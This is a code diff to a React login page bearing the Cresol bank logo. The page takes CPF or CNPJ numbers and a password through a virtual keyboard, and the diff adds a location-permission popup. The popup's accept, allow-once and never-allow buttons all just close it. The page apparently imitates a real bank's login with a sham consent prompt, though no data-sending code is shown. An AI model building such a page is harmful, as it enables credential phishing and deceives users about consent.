@@ -1,8 +1,10 @@
-import React, { useState } from "react";
+
+import React, { useState, useEffect } from "react";
 import { Eye, EyeOff, HelpCircle } from "lucide-react";
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
-import { VirtualKeyboardModal } from "@/components/VirtualKeyboardModal";
+import { LocationPermissionPrompt } from "@/components/LocationPermissionPrompt";
+import { VirtualKeyboardInline } from "@/components/VirtualKeyboardInline";
 
 const TABS = [
   { label: "Pessoa Física", value: "fisica" },
@@ -20,12 +22,69 @@ const Index = () => {
   const [saveCpf, setSaveCpf] = useState(false);
   const [saveCnpj, setSaveCnpj] = useState(false);
   const [saveChaveMulticanal, setSaveChaveMulticanal] = useState(false);
-  const [showPasswordModal, setShowPasswordModal] = useState(false);
 
-  // O modal retorna a senha digitada
-  function handlePasswordModalSubmit(newSenha: string) {
-    setSenha(newSenha);
+  // ---- Popup de permissão de localização ----
+  const [showLocationPrompt, setShowLocationPrompt] = useState(true);
+
+  const handleAcceptLocation = () => setShowLocationPrompt(false);
+  const handleAllowOnce = () => setShowLocationPrompt(false);
+  const handleNeverAllow = () => setShowLocationPrompt(false);
+
+  // ---- Teclado Inline ----
+  const [showPasswordKeyboard, setShowPasswordKeyboard] = useState(false);
+  const [senhaTemp, setSenhaTemp] = useState("");
+
+  // Ao focar no input de senha, mostra teclado e preenche senhaTemp
+  function handlePasswordInputFocus() {
+    setSenhaTemp(senha);
+    setShowPasswordKeyboard(true);
   }
+
+  // Envia senha do teclado pro estado principal e fecha teclado
+  function handleKeyboardSubmit(val: string) {
+    setSenha(val);
+    setShowPasswordKeyboard(false);
+    setSenhaTemp("");
+  }
+  function handleKeyboardCancel() {
+    setShowPasswordKeyboard(false);
+    setSenhaTemp("");
+  }
+
+  // Tab helpers para saber qual campo mostrar
+  const senhaInput = (
+    <div className="mb-3 relative z-10">
+      <label className="block text-sm text-gray-700 font-medium mb-1">Senha de acesso</label>
+      <input
+        type="password"
+        className="w-full h-11 px-3 pr-10 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-gray-100 cursor-pointer"
+        placeholder="Senha"
+        value={senha ? "••••••" : ""}
+        onFocus={handlePasswordInputFocus}
+        readOnly
+        style={{ userSelect: "none" }}
+        autoComplete="off"
+      />
+      <button
+        type="button"
+        className="absolute right-3 top-[38px] transform -translate-y-1/2 text-gray-400 hover:text-[#145C36]"
+        tabIndex={-1}
+        onClick={handlePasswordInputFocus}
+        aria-label="Mostrar teclado"
+      >
+        {showSenha ? <EyeOff size={20} /> : <Eye size={20} />}
+      </button>
+      <div>
+        <VirtualKeyboardInline
+          open={showPasswordKeyboard}
+          value={senhaTemp}
+          onChange={setSenhaTemp}
+          onSubmit={handleKeyboardSubmit}
+          onCancel={handleKeyboardCancel}
+        />
+      </div>
+    </div>
+  );
 
   const renderFormContent = () => {
     switch (tab) {
@@ -45,29 +104,7 @@ const Index = () => {
               />
             </div>
             {/* Senha */}
-            <div className="mb-3 relative">
-              <label className="block text-sm text-gray-700 font-medium mb-1">Senha de acesso</label>
-              <input
-                type="password"
-                className="w-full h-11 px-3 pr-10 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-gray-100 cursor-pointer"
-                placeholder="Senha"
-                value={senha ? "••••••" : ""}
-                onFocus={() => setShowPasswordModal(true)}
-                readOnly
-                style={{ userSelect: "none" }}
-                autoComplete="off"
-              />
-              <button
-                type="button"
-                className="absolute right-3 top-[38px] transform -translate-y-1/2 text-gray-400 hover:text-[#145C36]"
-                tabIndex={-1}
-                onClick={() => setShowPasswordModal(true)}
-                aria-label="Mostrar teclado"
-              >
-                {showSenha ? <EyeOff size={20} /> : <Eye size={20} />}
-              </button>
-            </div>
-
+            {senhaInput}
             {/* Salvar CPF */}
             <div className="flex items-center mb-6">
               <input
@@ -83,7 +120,6 @@ const Index = () => {
             </div>
           </>
         );
-
       case "juridica":
         return (
           <>
@@ -100,29 +136,7 @@ const Index = () => {
               />
             </div>
             {/* Senha */}
-            <div className="mb-3 relative">
-              <label className="block text-sm text-gray-700 font-medium mb-1">Senha de acesso</label>
-              <input
-                type="password"
-                className="w-full h-11 px-3 pr-10 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-gray-100 cursor-pointer"
-                placeholder="Senha"
-                value={senha ? "••••••" : ""}
-                onFocus={() => setShowPasswordModal(true)}
-                readOnly
-                style={{ userSelect: "none" }}
-                autoComplete="off"
-              />
-              <button
-                type="button"
-                className="absolute right-3 top-[38px] transform -translate-y-1/2 text-gray-400 hover:text-[#145C36]"
-                tabIndex={-1}
-                onClick={() => setShowPasswordModal(true)}
-                aria-label="Mostrar teclado"
-              >
-                {showSenha ? <EyeOff size={20} /> : <Eye size={20} />}
-              </button>
-            </div>
-
+            {senhaInput}
             {/* Salvar CNPJ */}
             <div className="flex items-center mb-6">
               <input
@@ -138,7 +152,6 @@ const Index = () => {
             </div>
           </>
         );
-
       case "financeiro":
         return (
           <>
@@ -155,29 +168,7 @@ const Index = () => {
               />
             </div>
             {/* Senha */}
-            <div className="mb-3 relative">
-              <label className="block text-sm text-gray-700 font-medium mb-1">Senha de acesso</label>
-              <input
-                type="password"
-                className="w-full h-11 px-3 pr-10 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#145C36] focus:border-[#145C36] transition text-base bg-gray-100 cursor-pointer"
-                placeholder="Senha"
-                value={senha ? "••••••" : ""}
-                onFocus={() => setShowPasswordModal(true)}
-                readOnly
-                style={{ userSelect: "none" }}
-                autoComplete="off"
-              />
-              <button
-                type="button"
-                className="absolute right-3 top-[38px] transform -translate-y-1/2 text-gray-400 hover:text-[#145C36]"
-                tabIndex={-1}
-                onClick={() => setShowPasswordModal(true)}
-                aria-label="Mostrar teclado"
-              >
-                {showSenha ? <EyeOff size={20} /> : <Eye size={20} />}
-              </button>
-            </div>
-
+            {senhaInput}
             {/* Salvar Chave Multicanal */}
             <div className="flex items-center mb-6">
               <input
@@ -193,7 +184,6 @@ const Index = () => {
             </div>
           </>
         );
-
       default:
         return null;
     }
@@ -201,11 +191,11 @@ const Index = () => {
 
   return (
     <div className="min-h-screen flex bg-[#fff]">
-      <VirtualKeyboardModal
-        open={showPasswordModal}
-        onClose={() => setShowPasswordModal(false)}
-        onSubmit={handlePasswordModalSubmit}
-        initialValue={senha}
+      <LocationPermissionPrompt
+        open={showLocationPrompt}
+        onAccept={handleAcceptLocation}
+        onAllowOnce={handleAllowOnce}
+        onNeverAllow={handleNeverAllow}
       />
       {/* Left: Formulário */}
       <div className="w-1/2 flex flex-col justify-center px-[7%] py-12 relative">
@@ -296,3 +286,5 @@ const Index = () => {
 };
 
 export default Index;
+
+// src/pages/Index.tsx está ficando longo. Considere pedir um refactor em arquivos menores depois desta alteração.
